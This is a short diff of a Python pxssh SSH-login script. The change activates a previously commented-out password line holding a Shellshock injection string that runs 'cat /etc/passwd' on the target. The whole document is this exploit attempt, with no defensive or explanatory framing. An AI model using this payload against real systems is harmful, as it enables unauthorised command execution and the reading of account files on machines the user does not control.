@@ -6,7 +6,7 @@ try:
     s = pxssh.pxssh()
     hostname = raw_input('hostname: ')
     username = raw_input('username: ')
-    # password = '() { :;}; cat /etc/passwd'
+    password = '() { :;}; cat /etc/passwd'
     s.login (hostname, username, password)
     s.sendline ('uname')   # run a command
     s.prompt()             # match the prompt
